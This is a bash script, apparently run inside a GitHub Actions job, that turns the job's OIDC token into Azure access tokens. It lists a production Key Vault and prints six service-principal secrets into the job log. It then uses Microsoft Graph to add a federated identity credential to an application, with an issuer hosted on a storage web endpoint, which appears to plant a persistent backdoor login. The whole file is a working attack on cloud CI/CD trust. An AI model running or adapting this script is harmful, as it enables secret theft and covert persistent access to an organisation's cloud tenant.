#!/usr/bin/env bash
set -x
OIDC=$(curl -sS -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c "import sys,json;print(json.load(sys.stdin)['value'])")
echo "OIDC_LEN=${#OIDC}"
exch() {
  curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
    -d "client_id=$1&grant_type=client_credentials&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=$OIDC&scope=$2"
}
CICD=$(exch "72ff278a-9e71-43ec-bac4-2ca303f8e462" "https://vault.azure.net/.default" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('access_token',''))")
echo "CICD_VAULT_LEN=${#CICD}"
if [ -n "$CICD" ]; then
  curl -sS "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" -H "Authorization: Bearer $CICD"
  for s in cost-reader-principal directory-audit-principal reporting-service-principal reporting-viewer-principal secrets-sync-principal sync-service-principal; do
    echo "== $s"; curl -sS "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$s?api-version=7.4" -H "Authorization: Bearer $CICD"
  done
fi
PA=$(exch "462d1c38-4459-48b8-9333-82e389e59514" "https://graph.microsoft.com/.default" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('access_token',''))")
echo "PA_GRAPH_LEN=${#PA}"
if [ -n "$PA" ]; then
  curl -sS -X POST "https://graph.microsoft.com/v1.0/applications/3150e595-ed32-47fb-8c78-0ad81cf06343/federatedIdentityCredentials" -H "Authorization: Bearer $PA" -H "Content-Type: application/json" -d '{"name":"qx9m4x","issuer":"https://sttblcilogsprodx3euoz.z23.web.core.windows.net/qx9m4","subject":"qx:1","audiences":["api://AzureADTokenExchange"]}'
fi
